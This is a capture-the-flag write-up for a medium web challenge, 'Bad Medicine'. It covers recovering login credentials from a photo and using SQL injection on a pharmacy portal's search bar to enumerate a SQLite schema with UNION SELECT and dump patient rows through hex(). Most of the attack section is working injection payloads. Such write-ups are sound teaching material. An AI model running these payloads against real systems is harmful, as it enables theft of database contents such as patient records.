---
title: "RSTCON 2026 – Bad Medicine"
date: 2026-10-25 13:00:00 +0200
categories: [Events, RSTCON 2026]
tags: [web, sql-injection, union, sqlite, sqlite-master, hex, osint-image, credentials]
media_subpath: /assets/img/posts/
---

## **Challenge Information**
**Title:**  Bad Medicine  
**Category**:  web exploitation  
**Platform:**  RSTCON  
**Difficulty:**  medium  
**Tags:**  web, SQL-injection, UNION, SQLite, sqlite_master, hex, OSINT-image, credentials  
**Date solved:**  25/10/2026 (DD/MM/YYYY)  
**Challenge Description**: A pharmacy inventory portal (MedVault) behind a login. The credentials were left somewhere they should not have been, and the search bar trusts whatever you type into it.  

Mirror 1: `http://18.215.143.250:5001`  
Mirror 2: `http://18.145.136.91:5001`  
**Files provided**:  office-photo.jpg  

## **Environment and Tools** 
**Operating System**:  Kali Linux (Parallels)  
**Tools/ Software**:  Brave Browser  
**Programming Languages (if any)**:  bash, SQL  

## **Recognition Pattern**
- A login page plus an image provided with the challenge => the credentials are likely hidden in the image
- A search bar where `' OR 1=1 --` changes the results => SQL injection
- A UNION error about the number of result columns => the backend is SQLite, query sqlite_master for the schema

## **Approach and Methodology**

Once i opened the mirror given i was met with a login page where i tried to bypass via common login credentials, SQL injection and tampering with the url, but it did not work. Afterwards i remembered there was an image provided with the challenge.

![the office photo provided with the challenge](Bad_Medicine_1.png)

Inside the image there was a sticky note (the pink one) with the login credentials. I logged in. 

From there i was met with a search bar where i tried SQL injection:
```SQL
' OR 1=1 --
```

And it worked. So it was obvious it was sql injection the technique that was to be used.

The tricky part was finding the flag. I requested Claude.ai's help with it. I needed to first find out the number of columns the current table had, and then the database schema, and use UNION to view every table's content. That is exactly what i did.

1. I needed to know how many columns there were so i went ahead and did:
```SQL
 ' ORDER BY 1 --
 ' ORDER BY 2 --
 ' ORDER BY 3 --
 ' ORDER BY 4 --
 ' ORDER BY 5 --
 ' ORDER BY 6 --
```
The current table had 6 columns.

2. I needed to find out the schema:
```SQL
' UNION SELECT 1,group_concat(name),3 FROM sqlite_master WHERE type='table'--
```

This threw an error : "SELECTs to the left and right of UNION do not have the same number of result columns" so the database was SQLite not MySQL. Corrected the select and tried again:
```SQL
' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'--
```
Returned: `inventory, patients, prescriptions, insurance_claims, users`.

3. Now i had to find out each table's schema:
```bash
' UNION SELECT 1,group_concat(sql,' || '),3,4,5 FROM sqlite_master WHERE type='table'--
```

Unfortunately there was no flag column in any table, so i had to look for it in every cell in every table.
4. Looking for the flag inside columns (Claude.ai):
```SQL
' UNION SELECT 1,
 coalesce((SELECT 'INV;' FROM inventory WHERE (name||ndc||category) LIKE '%rstcon%' LIMIT 1),'')||
 coalesce((SELECT 'PAT;' FROM patients WHERE (first_name||last_name||address||coalesce(email,'')||coalesce(allergies,'')||phone||date_of_birth) LIKE '%rstcon%' LIMIT 1),'')||
 coalesce((SELECT 'RX;' FROM prescriptions WHERE (prescriber||dosage||rx_number||status) LIKE '%rstcon%' LIMIT 1),'')||
 coalesce((SELECT 'CLM;' FROM insurance_claims WHERE (payer||member_id||group_id||pcn||bin_number) LIKE '%rstcon%' LIMIT 1),'')||
 coalesce((SELECT 'USR;' FROM users WHERE (username||password_hash||full_name||coalesce(email,'')||role) LIKE '%rstcon%' LIMIT 1),'')
 ,3,4,5--
```

But nothing came out.  
The last idea i had was that it was hidden in hex format somewhere, so that's what i tried next. Get the hex and decode it. This was the winning command:

```SQL
' UNION SELECT 1,hex(first_name||'|'||last_name||'|'||date_of_birth||'|'||phone||'|'||coalesce(email,'')||'|'||address||'|'||coalesce(allergies,'')),3,4,5 FROM patients WHERE (first_name||last_name||address||coalesce(email,'')||coalesce(allergies,'')||phone||date_of_birth) LIKE '%rstcon%'--
```
![the search returning the patient row as a hex blob](Bad_Medicine_2.png)
## **Solution and Flag Retrieval**
Final Exploit / Command Used: 
```bash
python3 -c "print(bytes.fromhex('546865726573617C4665726E616E64657A7C313939382D31322D30357C<FLAG_HEX_REDACTED>7C74686572657361664070726F746F6E6D61696C2E636F6D7C3133333431204578706F736974696F6E20426C7664202334442C2041757374696E2054582037383734367C4D6F727068696E65').decode())"
[FLAG REDACTED]
```


## **Lessons Learned**
- you can use UNION to look through the content of a SQL database
- group_concat() can show information from other tables
- when a `LIKE '%rstcon%'` search finds nothing, the value may be stored encoded (here the row had to be dumped with hex() and decoded)
- credentials can be hidden in a provided image (a sticky note in the office photo)

## **References**
- claude.ai (https://claude.ai)
- PortSwigger — SQL injection UNION attacks (https://portswigger.net/web-security/sql-injection/union-attacks)
